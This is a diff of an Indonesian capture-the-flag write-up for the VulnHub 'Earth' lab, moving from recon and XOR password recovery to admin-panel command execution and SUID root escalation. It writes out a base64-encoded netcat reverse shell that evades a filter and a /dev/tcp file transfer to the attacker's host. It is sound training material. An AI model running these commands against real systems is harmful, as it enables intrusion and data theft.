@@ -1,209 +1,219 @@
-# Earth Walkthrough
+# Earth — CTF Writeup
 
-## Objective
-
-Tujuan challenge ini adalah memperoleh akses root pada target machine melalui kombinasi web enumeration, analisis enkripsi XOR, remote command execution, dan privilege escalation.
+**Platform:** VulnHub  
+**Difficulty:** Easy  
+**Category:** Web, Privilege Escalation  
 
 ---
 
-# 1. Reconnaissance
+## Deskripsi
 
-## Host Discovery
+Machine ini mensimulasikan dua web server (`earth.local` dan `terratest.earth.local`) yang berjalan di satu mesin target. Alur exploitasinya dimulai dari enumerasi jaringan, analisis enkripsi XOR, akses admin panel, reverse shell, hingga privilege escalation ke root.
 
-Langkah pertama adalah mencari host aktif pada jaringan.
+---
+
+## Tahap 1 — Enumerasi Jaringan
+
+### Scan Host Aktif
 
 ```bash
 arp-scan -l
 ```
 
-Ditemukan alamat IP target yang akan digunakan pada tahap berikutnya.
+Dari output, catat IP target yang muncul.
 
----
-
-## Service Enumeration
-
-Selanjutnya dilakukan enumerasi service untuk mengetahui port yang terbuka, service yang berjalan, dan informasi tambahan yang tersedia.
+### Scan Port dan Service
 
 ```bash
-nmap -sC -sV -A <TARGET_IP>
+nmap -sV -sC -A <IP_TARGET>
 ```
 
-Hasil scanning menunjukkan adanya virtual host:
+Hasil scan menunjukkan beberapa port terbuka beserta service yang berjalan. Dari sini juga ditemukan dua DNS:
 
-```text
-earth.local
-terratest.earth.local
-```
+- `earth.local`
+- `terratest.earth.local`
 
-Agar domain tersebut dapat diakses secara lokal, tambahkan ke file hosts.
+### Tambahkan DNS ke /etc/hosts
+
+Agar domain bisa diakses lewat browser, tambahkan entri berikut:
 
 ```bash
 sudo nano /etc/hosts
 ```
 
-```text
-<TARGET_IP> earth.local
-<TARGET_IP> terratest.earth.local
+```
+<IP_TARGET>    earth.local
+<IP_TARGET>    terratest.earth.local
 ```
 
 ---
 
-# 2. Web Enumeration
+## Tahap 2 — Reconnaissance Web
 
-## earth.local
+### earth.local
 
-Saat diakses, website menampilkan beberapa pesan yang terlihat terenkripsi.
+Saat diakses, menampilkan halaman dengan form untuk encode/encrypt pesan. Ada beberapa string terenkripsi yang bisa disalin untuk keperluan decode nanti.
 
-Hal ini mengindikasikan adanya mekanisme komunikasi internal yang mungkin dapat dianalisis lebih lanjut.
+### terratest.earth.local
 
----
-
-## terratest.earth.local
-
-Saat diakses hanya menampilkan halaman sederhana bertuliskan:
-
-```text
-Test Site
-```
-
-Meskipun terlihat tidak menarik, environment testing sering kali mengandung informasi sensitif yang tidak tersedia pada website utama.
+Hanya menampilkan teks sederhana: *"test site"*.
 
 ---
 
-## Directory Enumeration
+## Tahap 3 — Directory Enumeration
 
-Dilakukan pencarian direktori tersembunyi.
+### Gobuster
 
 ```bash
-gobuster dir -u http://earth.local \
--w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Ditemukan endpoint:
+### Temuan
 
-```text
-/admin
-```
+| URL | Keterangan |
+|---|---|
+| `http://earth.local/admin` | Halaman login admin panel |
+| `http://terratest.earth.local/robots.txt` | File robots.txt tersedia |
 
-Mengakses endpoint tersebut menampilkan halaman login administrator.
-
-### Checkpoint
-
-```text
-Admin Login Page Found
-```
+> **Checkpoint:** Halaman `http://earth.local/admin` menampilkan form login.
 
 ---
 
-## robots.txt Analysis
+## Tahap 4 — Analisis robots.txt dan Catatan Testing
 
-Pada subdomain testing ditemukan file robots.txt.
+### Akses robots.txt
 
-```text
+```
 http://terratest.earth.local/robots.txt
 ```
 
 Isi file:
 
-```text
+```
 Disallow: /testingnotes.*
 ```
 
-Endpoint tersebut kemudian diakses dan menghasilkan catatan internal developer.
+### Akses /testingnotes
 
----
-
-## Information Disclosure
+```
+http://terratest.earth.local/testingnotes.txt
+```
 
 Isi catatan:
 
-```text
-Using XOR encryption as the algorithm.
-testdata.txt was used to test encryption.
-terra used as username for admin portal.
+```
+Testing secure messaging system notes:
+* Using XOR encryption as the algorithm, should be safe as used in RSA.
+* Earth has confirmed they have received our sent messages.
+* testdata.txt was used to test encryption.
+* terra used as username for admin portal.
+
+Todo:
+* How do we send our monthly keys to Earth securely? Or should we change keys weekly?
+* Need to test different key lengths to protect against bruteforce. How long should the key be?
+* Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
 ```
 
-Informasi penting yang berhasil diperoleh:
+### Informasi Penting
 
-| Data           | Nilai        |
-| -------------- | ------------ |
-| Username Admin | terra        |
-| Encryption     | XOR          |
-| Reference File | testdata.txt |
-
----
-
-# 3. Credential Recovery
-
-Dari catatan sebelumnya diketahui bahwa:
-
-* Sistem menggunakan XOR
-* Tersedia file testdata.txt
-* Username administrator adalah terra
-
-Langkah berikutnya adalah mengumpulkan seluruh ciphertext yang tersedia pada halaman utama earth.local.
-
-Ciphertext tersebut kemudian dibandingkan dengan data yang tersedia pada testdata.txt untuk memperoleh key XOR yang digunakan.
-
-Setelah key berhasil diidentifikasi, ciphertext dapat didekripsi menjadi plaintext yang dapat dibaca.
-
-Salah satu plaintext yang diperoleh ternyata merupakan password administrator.
+- **Algoritma enkripsi:** XOR
+- **File kunci:** `testdata.txt`
+- **Username admin:** `terra`
+- **Password:** masih terenkripsi, perlu di-decode
 
 ---
 
-## Admin Access
+## Tahap 5 — Decode Password
 
-Login dilakukan menggunakan kredensial:
+### Ambil Key dari testdata.txt
 
-```text
-Username : terra
-Password : <hasil dekripsi>
+```
+http://terratest.earth.local/testdata.txt
 ```
 
-Login berhasil dilakukan dan akses ke panel administrator diperoleh.
+Salin isi file tersebut — ini adalah key XOR yang digunakan.
+
+### Decode Pesan Terenkripsi
+
+Kunjungi `earth.local`, salin satu per satu string terenkripsi yang ada di halaman tersebut. Decode setiap string menggunakan XOR dengan key dari `testdata.txt`.
+
+Bisa menggunakan tool online seperti [CyberChef](https://gchq.github.io/CyberChef/) dengan operasi:
+
+```
+From Hex → XOR (key dari testdata.txt, UTF-8)
+```
+
+Hasil yang menghasilkan teks yang bisa dibaca manusia adalah password adminnya.
 
 ---
 
-# 4. Initial Access
+## Tahap 6 — Login Admin Panel
 
-Setelah masuk ke panel administrator ditemukan fitur yang memungkinkan eksekusi command pada server.
+Akses:
 
-Contoh command yang berhasil dijalankan:
+```
+http://earth.local/admin
+```
+
+Masukkan kredensial:
+
+- **Username:** `terra`
+- **Password:** `<hasil decode XOR>`
+
+Setelah login, admin panel menampilkan antarmuka yang bisa menjalankan command langsung di server (seperti `ls`, `cat`, `whoami`, dll).
+
+---
+
+## Tahap 7 — Reverse Shell
+
+### Cek User Saat Ini
 
 ```bash
 whoami
-pwd
-ls
-cat
 ```
 
-Output menunjukkan bahwa command dieksekusi sebagai user biasa dan belum memiliki hak akses root.
+Output menunjukkan bukan root — perlu eskalasi.
 
----
+### Bypass Pembatasan nc Langsung
 
-# 5. Reverse Shell
+`netcat` (`nc`) langsung diblokir oleh server. Solusinya: encode perintah dengan Base64 terlebih dahulu.
 
-Karena panel administrator dapat menjalankan command pada server, fitur tersebut dapat digunakan untuk memperoleh shell interaktif.
+### Di Mesin Kita — Siapkan Listener
 
-Reverse shell berhasil diperoleh dan koneksi kembali ke mesin attacker berhasil dibuat.
+```bash
+nc -lvnp 4444
+```
 
-Setelah shell didapatkan, dilakukan upgrade TTY agar shell lebih stabil.
+### Buat Payload Reverse Shell
+
+```bash
+echo "nc -e /bin/bash <IP_MESIN_KITA> 4444" | base64
+```
+
+Salin output Base64 yang dihasilkan.
+
+### Jalankan Payload di Admin Panel
+
+Masukkan perintah berikut ke dalam input CLI di admin panel:
+
+```bash
+echo "<HASIL_BASE64>" | base64 -d | bash
+```
+
+Mesin kita akan menerima koneksi reverse shell.
+
+### Upgrade Shell
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Status:
-
-```text
-Interactive Shell Obtained
-```
-
 ---
 
-# 6. Privilege Escalation Enumeration
+## Tahap 8 — Privilege Escalation
 
-Dilakukan pencarian file SUID.
+### Cari Binary dengan SUID Bit
 
 ```bash
 find / -perm -u=s 2>/dev/null
@@ -211,204 +221,115 @@ find / -perm -u=s 2>/dev/null
 
 Ditemukan binary menarik:
 
-```text
+```
 /usr/bin/reset_root
 ```
 
-Binary ini tidak termasuk binary standar Linux sehingga menjadi kandidat utama untuk dianalisis.
+### Transfer Binary ke Mesin Kita untuk Analisis
 
----
-
-# 7. Binary Analysis
-
-Selama enumerasi SUID ditemukan binary menarik:
-
-```bash
-find / -perm -u=s 2>/dev/null
-```
-
-Output:
-
-```text
-/usr/bin/reset_root
-```
-
-Karena bukan binary standar Linux, binary tersebut dianalisis lebih lanjut.
-
-## Transfer Binary
-
-Binary disalin dari target ke mesin attacker untuk dianalisis secara lokal.
-
-Pada mesin attacker:
+**Di mesin kita — buka listener untuk menerima file:**
 
 ```bash
 nc -lvnp 3333 > reset_root
 ```
 
-Pada shell target:
+**Di mesin target (via reverse shell):**
 
 ```bash
-cat /usr/bin/reset_root > /dev/tcp/<ATTACKER_IP>/3333
+cat /usr/bin/reset_root > /dev/tcp/<IP_MESIN_KITA>/3333
 ```
 
-Setelah transfer selesai:
+### Analisis Binary dengan ltrace
 
 ```bash
 chmod +x reset_root
-```
-
-## Dynamic Analysis
-
-Analisis dilakukan menggunakan `ltrace` untuk melihat library call yang dipanggil program.
-
-```bash
 ltrace ./reset_root
 ```
 
-Output menunjukkan adanya pengecekan terhadap file tertentu:
+Output `ltrace` menunjukkan binary mencoba mengakses file tertentu, contoh:
 
-```text
-access("/blab/lalab", F_OK) = -1
+```
+access("/blab/lalab", ...)
 ```
 
-## Analisis
+### Buat File yang Dibutuhkan di Mesin Target
 
-Dari output tersebut dapat disimpulkan bahwa program memeriksa keberadaan file:
-
-```text
-/blab/lalab
-```
-
-Jika file tidak ada, program tidak melanjutkan ke proses berikutnya.
-
-Karena path tersebut dapat dibuat oleh user yang sedang digunakan, maka dibuat file yang diminta.
-
-Pada target:
+Kembali ke sesi reverse shell, buat file-file yang dicari oleh `reset_root`:
 
 ```bash
-mkdir -p /blab
 touch /blab/lalab
 ```
 
-## Re-run Binary
-
-Binary dijalankan kembali:
+### Jalankan reset_root
 
 ```bash
 /usr/bin/reset_root
 ```
 
-Kali ini program berhasil melewati pengecekan dan menampilkan informasi sensitif berupa password root.
-
-Temuan ini menunjukkan bahwa mekanisme validasi pada binary hanya bergantung pada keberadaan file tertentu yang dapat dibuat oleh user biasa.
-
-
-# 8. Exploiting reset_root
-
-Setelah file yang diperlukan dibuat pada target, binary dijalankan kembali.
-
-Program kemudian mengungkap informasi sensitif yang dapat digunakan untuk memperoleh akses administratif.
-
-Dari output tersebut diperoleh password root.
+Binary akan menampilkan output berisi password root.
 
 ---
 
-# 9. Root Access
-
-Menggunakan password yang diperoleh:
+## Tahap 9 — Login sebagai Root
 
 ```bash
 su root
 ```
 
-Verifikasi:
+Masukkan password yang diperoleh dari output `reset_root`.
+
+### Ambil Flag
 
 ```bash
-whoami
+cat /root/root_flag.txt
 ```
-
-Output:
-
-```text
-root
-```
-
-Privilege escalation berhasil dilakukan.
 
 ---
 
-# 10. Capture The Flag
+## Ringkasan Alur Eksploitasi
 
-Flag terakhir ditemukan pada:
-
-```text
-/ root / root_flag.txt
 ```
-
-(ditulis tanpa spasi pada sistem sebenarnya)
-
-Membaca file tersebut menghasilkan root flag.
+Scan jaringan (arp-scan + nmap)
+        ↓
+Tambah DNS ke /etc/hosts
+        ↓
+Enumerasi direktori (Gobuster)
+        ↓
+Temukan /testingnotes.txt → username + algoritma XOR
+        ↓
+Decode ciphertext → password admin
+        ↓
+Login earth.local/admin
+        ↓
+Reverse shell via Base64 + nc
+        ↓
+Temukan SUID binary /usr/bin/reset_root
+        ↓
+Analisis dengan ltrace → buat file trigger
+        ↓
+Jalankan reset_root → dapat password root
+        ↓
+su root → cat /root/root_flag.txt ✓
+```
 
 ---
 
-# Attack Path Summary
+## Tools yang Digunakan
 
-```text
-ARP Scan
-   │
-   ▼
-Nmap Enumeration
-   │
-   ▼
-Virtual Host Discovery
-   │
-   ▼
-Directory Enumeration
-   │
-   ▼
-Admin Login Page Discovery
-   │
-   ▼
-robots.txt Disclosure
-   │
-   ▼
-Developer Notes Disclosure
-   │
-   ▼
-XOR Analysis
-   │
-   ▼
-Password Recovery
-   │
-   ▼
-Admin Access
-   │
-   ▼
-Command Execution
-   │
-   ▼
-Reverse Shell
-   │
-   ▼
-SUID Enumeration
-   │
-   ▼
-reset_root Analysis
-   │
-   ▼
-Root Password Disclosure
-   │
-   ▼
-Root Access
-   │
-   ▼
-Root Flag
-```
+| Tool | Fungsi |
+|---|---|
+| `arp-scan` | Discover host di jaringan lokal |
+| `nmap` | Port scan dan service enumeration |
+| `gobuster` | Directory brute-force |
+| `CyberChef` | Decode enkripsi XOR |
+| `netcat (nc)` | Listener reverse shell & transfer file |
+| `ltrace` | Trace library call pada binary |
 
-# Lessons Learned
+---
 
-1. Informasi sensitif tidak boleh disimpan pada environment testing.
-2. XOR bukan pengganti algoritma kriptografi modern untuk penyimpanan kredensial.
-3. robots.txt tidak boleh dianggap sebagai mekanisme keamanan.
-4. Fitur eksekusi command pada panel admin dapat berujung pada Remote Code Execution.
-5. Binary SUID kustom harus diaudit secara menyeluruh karena berpotensi menyebabkan privilege escalation.
+## Pelajaran dari Machine Ini
+
+- **XOR encryption bukan enkripsi yang aman** — kuncinya bisa ditemukan dari file yang terbuka publik.
+- **File `robots.txt`** sering menyembunyikan path sensitif yang tidak ingin diindeks.
+- **Binary SUID** dengan logika bergantung pada keberadaan file tertentu bisa dieksploitasi dengan cara membuat file tersebut secara manual.
+- **Command injection di admin panel** adalah celah kritis — selalu validasi dan sanitasi input.
